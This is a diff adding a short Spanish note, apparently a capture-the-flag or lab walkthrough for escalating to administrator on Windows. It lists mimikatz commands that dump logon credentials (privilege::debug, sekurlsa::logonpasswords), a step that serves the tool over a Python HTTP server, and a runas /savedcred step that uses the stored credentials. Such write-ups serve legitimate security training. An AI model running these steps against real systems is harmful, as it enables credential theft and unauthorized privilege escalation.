@@ -1,0 +1,18 @@
+Root.txt
+Mirar si hay credenciales guardadas en el Credential Manager
+
+Descargar mimikatz.exe:
+    - python3 - hhtp.server
+    - En el edge, descargar, poniendo nuestra IP
+
+Ejecutar mimikatz.exe:
+    - log
+    - privilege::debug, 
+    - sekurlsa::logonpasswords
+    - exit 
+
+Y en el archivo .log creado o en la pantalla mismo, ver si hay alguna cred. ¡Bingo! Tenemos la del admin. Al pareceder a ejecutado alguna tarea y se han 
+guardado sus credenciales.
+
+Ahora con la pass podemos convertirnos en admin:
+runas /user:administrator /savedcred powershell
